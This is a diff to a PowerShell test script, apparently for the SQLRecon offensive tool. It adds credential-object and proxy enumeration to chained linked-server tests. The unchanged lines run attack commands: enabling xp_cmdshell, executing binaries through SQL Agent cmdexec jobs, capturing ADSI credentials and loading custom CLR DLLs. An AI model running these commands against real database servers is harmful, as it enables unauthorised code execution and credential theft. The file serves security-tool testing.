@@ -10,7 +10,7 @@
 #>
 $global:timeout = 1
 $global:count = 1
-$global:modules = 31
+$global:modules = 33
 $global:timestamp = Get-Date -Format "MM-dd-yyyy-HH-mm"
 
 <#
@@ -119,6 +119,8 @@ Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3,$serv
 Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3,$server4 /chain /m:enablexp"
 Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3 /chain /m:adsi /adsi:adsilink /lport:30000"
 Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3 /chain /m:agentstatus"
+Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3 /chain /m:credentialobjects"
+Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3 /chain /m:proxies"
 Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3 /chain /m:agentcmd /subsystem:cmdexec /command:'c:\temp\mb-chain-1.exe'"
 Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3 /chain /m:agentcmd /c:'notepad'"
 Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3 /chain /m:clr /dll:'c:\temp\sql-chain.dll' /function:CustomFunctionName"
